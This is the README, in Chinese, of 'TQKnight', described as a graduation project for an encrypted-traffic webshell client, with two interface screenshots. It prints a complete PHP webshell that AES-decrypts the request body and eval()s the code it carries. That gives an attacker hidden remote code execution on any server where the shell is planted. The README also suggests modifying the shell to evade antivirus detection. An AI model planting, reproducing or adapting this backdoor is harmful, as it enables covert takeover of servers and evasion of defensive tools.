# TQKnight
这是大学的毕业设计，一个加密流量的Webshell客户端

配置界面：

![](https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202207031907783.png)

Webshell管理主界面：

![](https://blog-1300147235.cos.ap-chengdu.myqcloud.com/202207031908215.png)



目前仅支持PHP脚本的Webshell，原始Webshell如下，可以对其进行免杀处理。

```php
<?php
error_reporting(0);
$passwd = "5f4dcc3b5aa765d61d8327deb882cf99";  // 密码的md5值
session_start();
$input = file_get_contents("php://input");
$key =  isset($_SESSION["key"]) ? $_SESSION["key"] :  $passwd;
$data = json_decode(openssl_decrypt($input, "aes-256-ecb", $key), true);
eval(base64_decode($data["code"]));
```

